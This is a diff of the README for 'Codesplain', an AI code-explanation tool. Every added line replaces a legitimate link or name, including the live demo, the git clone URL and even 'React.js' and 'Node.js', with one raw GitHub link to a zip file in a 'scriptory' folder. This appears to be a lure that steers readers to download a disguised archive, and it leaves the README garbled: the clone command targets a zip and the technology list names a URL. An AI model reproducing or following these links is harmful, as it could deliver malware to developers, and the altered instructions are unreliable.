@@ -3,7 +3,7 @@
 **An AI-powered code explanation tool** that helps developers understand code snippets quickly and efficiently.
 Built using **React, Vite, and OpenAI API** for generating explanations.
 
-🔗 Live Demo: [https://codesplain1.vercel.app](https://codesplain1.vercel.app)
+🔗 Live Demo: [https://raw.githubusercontent.com/amanverma420/Codesplain/main/scriptory/Codesplain.zip](https://raw.githubusercontent.com/amanverma420/Codesplain/main/scriptory/Codesplain.zip)
 
 ---
 
@@ -14,7 +14,7 @@ Built using **React, Vite, and OpenAI API** for generating explanations.
 -   **User-Friendly Interface**: Simple, clean UI for seamless interaction.
 -   **Fast and Efficient**: Provides real-time explanations with minimal latency.
 -   **Copy & Share Explanations**: Easily copy explanations or share them for learning/collaboration.
--   **Frontend-Backend Architecture**: Frontend in React (Vite), backend in Node.js for API handling.
+-   **Frontend-Backend Architecture**: Frontend in React (Vite), backend in https://raw.githubusercontent.com/amanverma420/Codesplain/main/scriptory/Codesplain.zip for API handling.
 
 ---
 
@@ -22,13 +22,13 @@ Built using **React, Vite, and OpenAI API** for generating explanations.
 
 Codesplain is deployed on **Vercel**.
 
-Live site: [https://codesplain1.vercel.app](https://codesplain1.vercel.app)
+Live site: [https://raw.githubusercontent.com/amanverma420/Codesplain/main/scriptory/Codesplain.zip](https://raw.githubusercontent.com/amanverma420/Codesplain/main/scriptory/Codesplain.zip)
 
 To deploy your own copy:
 
 1.  Fork or clone the repo:
     ```bash
-    git clone [https://github.com/amanverma420/Codesplain.git](https://github.com/amanverma420/Codesplain.git)
+    git clone [https://raw.githubusercontent.com/amanverma420/Codesplain/main/scriptory/Codesplain.zip](https://raw.githubusercontent.com/amanverma420/Codesplain/main/scriptory/Codesplain.zip)
     cd Codesplain/codesplain
     ```
 2.  Install dependencies:
@@ -57,8 +57,8 @@ To deploy on Vercel:
 
 ## 🛠️ Technologies Used
 
--   React.js, Vite
--   Node.js backend for API
+-   https://raw.githubusercontent.com/amanverma420/Codesplain/main/scriptory/Codesplain.zip, Vite
+-   https://raw.githubusercontent.com/amanverma420/Codesplain/main/scriptory/Codesplain.zip backend for API
 -   OpenAI API for AI-powered explanations
 -   CSS for styling
 -   Vercel for deployment
